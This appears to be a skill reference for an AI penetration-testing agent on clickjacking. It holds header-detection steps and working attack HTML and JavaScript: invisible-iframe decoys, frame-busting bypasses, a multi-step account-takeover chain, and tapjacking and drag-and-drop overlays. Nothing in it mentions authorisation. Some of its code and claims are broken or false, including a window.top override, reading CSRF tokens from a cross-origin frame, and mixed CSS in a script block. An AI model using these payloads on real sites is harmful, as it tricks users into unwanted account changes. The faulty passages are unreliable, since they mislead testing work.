---
name: clickjacking
description: "Clickjacking (UI Redressing) attack techniques including frame injection, cookie forcing, and multi-step clickjacking"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["clickjacking", "ui redressing", "frame injection", "ui redress", "overlay attack", "cursorjacking", "scrolljacking", "tapjacking", "x-frame", "frame-ancestors"]
contextBoosts: [auth]
mitreAttack: ["T1189", "T1200"]
owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
---

# Clickjacking (UI Redressing) — Skill Reference

## 1. When to Use

- Target responds with missing or misconfigured `X-Frame-Options` header
- Target lacks CSP `frame-ancestors` directive
- Target is a state-changing application (password change, fund transfer, settings modification)
- Target uses session cookies sent automatically on iframe load
- Testing mobile or touch-based interfaces for overlay vulnerabilities
- Scanning for multi-step clickjacking chains (e.g., password change → email change → account takeover)

## 2. When NOT to Use

- Target explicitly blocks framing via both `X-Frame-Options: DENY` and `CSP: frame-ancestors 'none'`
- Target sets `X-Frame-Options: SAMEORIGIN` and attacker origin is external (cannot bypass same-origin)
- Purely static informational pages with no state-changing actions
- Target already implements robust anti-clickjacking (Verified framing headers + JavaScript frame-busting that is bypass-resistant)

## 3. Auth Context

- Clickjacking is most impactful when the victim is authenticated — the iframe inherits the victim's session cookies
- Prioritize pages behind authentication: profile settings, email change, password reset, payment forms, OAuth consent screens
- Unauthenticated clickjacking is possible but limited (e.g., tricking users into submitting login forms to an attacker-controlled endpoint)
- If auth is required, ensure `observeHumanActions` or `getCapturedHeaders` confirms an active session before testing framing

## 4. X-Frame-Options Detection

### Header Values

| Value | Effect |
|-------|--------|
| `DENY` | Page cannot be framed by any origin — strongest protection |
| `SAMEORIGIN` | Page can only be framed by the same origin — allows self-framing |
| `ALLOW-FROM <uri>` | Page can be framed only by specified origin — deprecated, unsupported in modern browsers |

### Detection Method

1. Fetch target page with `httpRequest`
2. Inspect response headers for `X-Frame-Options` (case-insensitive)
3. Classify:
   - **Missing entirely** → Vulnerable, proceed with iframe injection
   - **`DENY`** → Not frameable (verify with actual iframe test in case of misconfiguration)
   - **`SAMEORIGIN`** → Test: can attacker create a subdomain they control on the same eTLD+1? If yes, bypass is possible
   - **`ALLOW-FROM`** → Deprecated; test with modern browsers to confirm if actually enforced

### Common Misconfigurations

- Header present on some endpoints but absent on others (e.g., `/api/v1/settings` returns it, `/settings` does not)
- Header present on main page but absent on modal dialogs or embedded views
- Header present on HTTP response but absent on HTTPS response (or vice versa)
- Multiple `X-Frame-Options` headers with conflicting values

## 5. CSP `frame-ancestors` Directive

### Syntax

```
Content-Security-Policy: frame-ancestors 'none';           // blocks all framing
Content-Security-Policy: frame-ancestors 'self';           // same-origin only
Content-Security-Policy: frame-ancestors https://trusted.com;  // specific origin
```

### Bypass Strategy

- **`frame-ancestors` overrides `X-Frame-Options`** — if both are present, `frame-ancestors` takes precedence in modern browsers
- Test pages individually: CSP may be set globally but missing on specific routes
- Look for CSP reported in `Content-Security-Policy-Report-Only` — this means the policy is not enforced
- If CSP uses `frame-ancestors 'self'`, test whether the attacker can host content on a subdomain or path that matches the same origin
- Pages with `frame-ancestors` but no `frame-ancestors` directive in the CSP value are still vulnerable — check the full CSP string

### Automated Detection

1. Fetch each target endpoint
2. Check for `Content-Security-Policy` header
3. Parse the CSP string for `frame-ancestors`
4. If absent or `'none'` is missing, the page is potentially frameable
5. Verify with `evaluateRendered` by loading the page in an actual iframe

## 6. Frame Busting Busts

### What is Frame Busting?

JavaScript-based protection that attempts to break out of iframes:

```javascript
// Common frame-busting code
if (self !== top) { top.location = self.location; }
```

### Bypass Techniques

**Technique 1: Sandbox Attribute**

```html
<iframe sandbox="allow-forms allow-scripts" src="https://target.com"></iframe>
```
The `sandbox` attribute (without `allow-top-navigation`) prevents the iframe from navigating the top frame. The frame-busting script cannot redirect `top.location`.

**Technique 2: Two-Frame Nesting**

```html
<!-- Outer frame -->
<iframe src="https://target.com">
  <!-- Inner frame loads attacker content that does NOT trigger frame-busting -->
</iframe>
```
If frame-busting checks `self === top` and there is an intermediate frame, the check may pass.

**Technique 3: Overwrite `top.location` Setter**

```javascript
// In attacker page before iframe loads
Object.defineProperty(window, 'top', { get: function() { return window; } });
```

**Technique 4: `about:blank` Origin Trick**

If the target's frame-busting code uses `document.referrer` or checks the referrer, an `about:blank` iframe may bypass the check.

**Technique 5: HTTPS/HTTP Mixed Content**

If target is HTTPS and attacker page is HTTP, the browser may block the frame entirely — but the reverse (attacker HTTPS framing HTTP target) may still work.

### Verification

After applying bypass, use `evaluateRendered` to confirm:
- The iframe content is the target page (not an error page)
- The target's JavaScript did not navigate the parent frame
- Interactive elements within the iframe are clickable

## 7. Iframe Injection — Basic Attack Setup

### Minimal Proof of Concept

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    iframe {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      opacity: 0.0001;  /* Nearly invisible */
      z-index: 2;
    }
    .decoy {
      position: absolute;
      top: 0; left: 0;
      z-index: 1;
      font-size: 24px;
      padding: 20px;
    }
  </style>
</head>
<body>
  <div class="decoy">Click here to claim your prize!</div>
  <iframe src="https://target.com/settings" sandbox="allow-forms allow-scripts"></iframe>
</body>
</html>
```

### Overlay Alignment

- Use `evaluateRendered` to inspect the target page's layout
- Match the overlay button position to the iframe's interactive element position
- Use `opacity: 0.0001` (not `display: none` or `visibility: hidden` — these prevent interaction)
- Test with `pointer-events: none` on the overlay if elements need to pass through

### Cookie Forcing via Iframe

If the target uses cookies for authentication and the victim is logged in:

1. Embed the target page in an iframe
2. The browser sends cookies automatically (session cookie, CSRF token)
3. The iframe renders the authenticated view
4. Overlay a deceptive UI that aligns with the target's action buttons

**Limitation**: If the target sets `SameSite=Strict` or `SameSite=Lax` cookies, cross-site iframe requests will not send cookies.

## 8. Cookie Forcing

### When Cookie Forcing Applies

- Target uses `SameSite=None` or no `SameSite` attribute on session cookies
- Target relies on cookies for auth (not custom headers or tokens in the URL)
- Target does not validate CSRF tokens on state-changing requests

### Technique

1. Identify the target's authentication cookie name
2. Use `getCapturedHeaders` to observe what cookies the browser sends during normal browsing
3. Craft an iframe that loads the target page — cookies are sent automatically
4. The iframe renders the authenticated state
5. Overlay deceptive UI to trick the user into clicking

### CSRF Token Bypass

- If target uses CSRF tokens embedded in forms, the iframe will load the form with a valid token
- The attacker does not need to know the token — it is present in the iframe's DOM
- Use `evaluateRendered` to extract the CSRF token from the iframe's DOM

## 9. Multi-Step Clickjacking

### Concept

Chain multiple clicks across sequential iframes or page loads to perform complex actions.

### Example: Account Takeover Chain

**Step 1**: Click "Change Email" button (iframe overlay #1)
```html
<iframe id="step1" src="https://target.com/settings/email" sandbox="allow-forms allow-scripts"></iframe>
```

**Step 2**: After click, load iframe #2 targeting the email confirmation input
```html
<iframe id="step2" src="https://target.com/settings/email/confirm" sandbox="allow-forms allow-scripts"></iframe>
```

**Step 3**: Load iframe #3 targeting the "Save" or "Confirm" button

### Implementation

```javascript
const steps = [
  { overlay: '#change-email-btn', iframe: 'https://target.com/settings/email' },
  { overlay: '#email-input', iframe: 'https://target.com/settings/email/confirm' },
  { overlay: '#save-btn', iframe: 'https://target.com/settings/email/complete' }
];

let currentStep = 0;
function loadStep(step) {
  document.getElementById('attacker-overlay').innerHTML = steps[step].overlayHtml;
  document.getElementById('target-frame').src = steps[step].iframe;
}

// After each click, load next step
document.getElementById('target-frame').addEventListener('load', () => {
  if (currentStep < steps.length - 1) {
    currentStep++;
    loadStep(currentStep);
  }
});
```

### Challenges

- Timing: each iframe load introduces latency
- Session state: the session must remain valid across all steps
- Browser security: some browsers block rapid sequential iframe navigations
- Visual alignment: overlay positions must match across different page layouts

## 10. Drag-and-Drop Clickjacking

### HTML5 Drag-and-Drop Attacks

The `dragstart`, `drag`, and `drop` events can be triggered across iframes in some browsers.

```html
<div draggable="true" id="drag-source">
  Drag me to win a prize!
</div>

<iframe src="https://target.com/upload" sandbox="allow-scripts"></iframe>

<script>
document.getElementById('drag-source').addEventListener('dragstart', (e) => {
  e.dataTransfer.setData('text/plain', 'malicious-payload');
});
</script>
```

### Use Cases

- Trick users into dragging a file upload button
- Trigger drag-and-drop file uploads to attacker-controlled endpoints
- bypass some click-jacking protections that only detect click events

## 11. Scrolljacking

### Concept

Hijack the scroll position to align different elements with the user's viewport, causing unintended interactions.

### Technique

```javascript
// Override scroll behavior
window.addEventListener('scroll', (e) => {
  // Redirect scroll to a hidden iframe
  document.getElementById('target-frame').contentWindow.scrollBy(0, e.deltaY);
});

// Or use CSS to create misleading scroll behavior
.overflow-container {
  height: 100vh;
  overflow: hidden;
  position: relative;
}
```

### Detection

- Test if the page prevents default scroll behavior
- Test if scroll events are captured and redirected
- Use `evaluateRendered` to check if scroll position is being manipulated

## 12. Mobile Tapjacking

### Touch-Based Overlay Attacks

On mobile devices, tapjacking uses touch events instead of click events.

### Technique

```html
<style>
  .touch-overlay {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 9999;
    background: rgba(255,255,255,0.01);  /* Nearly invisible */
  }
  .touch-target {
    position: absolute;
    /* Position over the iframe's button */
    top: 300px; left: 50px;
    width: 200px; height: 60px;
  }
</style>

<div class="touch-overlay">
  <div class="touch-target">Tap to claim reward</div>
</div>
<iframe src="https://target.com/settings" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.0001;"></iframe>
```

### Mobile-Specific Considerations

- Touch events (`touchstart`, `touchend`) can be intercepted
- Some mobile browsers have additional protections against iframe overlays
- iOS Safari blocks cross-origin iframe interactions more aggressively than Android Chrome
- Test with `evaluateRendered` on both iOS and Android user agents
- Pinch-to-zoom can be used to align overlays more precisely

## 13. Testing Methodology

### Automated Detection Flow

```
1. httpRequest → Fetch target page, capture response headers
2. parseResponse → Extract X-Frame-Options and CSP frame-ancestors
3. Classify:
   ├── Missing both headers → VULNERABLE (proceed to PoC)
   ├── Has DENY or frame-ancestors 'none' → NOT VULNERABLE (verify with iframe)
   └── Has SAMEORIGIN or frame-ancestors 'self' → TEST same-origin bypass
4. evaluateRendered → Load target in iframe, confirm rendering
5. writeFinding → Document vulnerability with evidence
6. recordEvidence → Save headers, iframe test result, overlay alignment proof
```

### Manual Testing Tools

- **Burp Clickbandit**: Burp Suite extension for automated clickjacking PoC generation
- **Manual iframe injection**: Craft HTML pages with iframe + overlay
- **Browser DevTools**: Inspect frame tree, test sandbox attributes, debug overlay alignment

### Proof of Concept Checklist

- [ ] Target page renders inside iframe (not blocked by headers)
- [ ] Overlay elements align with target's interactive elements
- [ ] Click events on overlay propagate to iframe elements
- [ ] Session cookies are sent in iframe context (SameSite check)
- [ ] CSRF tokens are present in iframe-loaded forms
- [ ] Frame-busting JavaScript is absent or bypassable
- [ ] PoC page works in target browser (Chrome, Firefox, Safari, Edge)

## 14. Anti-Hallucination

- **Do not claim** a page is vulnerable to clickjacking without verifying that it actually renders inside an iframe. Headers may be present but not enforced, or absent but compensated by other protections.
- **Do not assume** frame-busting code exists or works without testing it. Many legacy pages have frame-busting code that is ineffective against modern bypass techniques.
- **Do not report** `X-Frame-Options: ALLOW-FROM` as effective protection — it is deprecated and ignored by most modern browsers.
- **Do not assume** cookies are sent in cross-origin iframes — always verify `SameSite` attribute values from captured headers.
- **Always verify** with `evaluateRendered` that the iframe actually loads the target content, not an error page or redirect.
- **Do not claim** multi-step clickjacking is feasible without testing that session state persists across iframe navigations.
- **Do not assume** all pages on a domain have the same framing policy — test each endpoint individually.
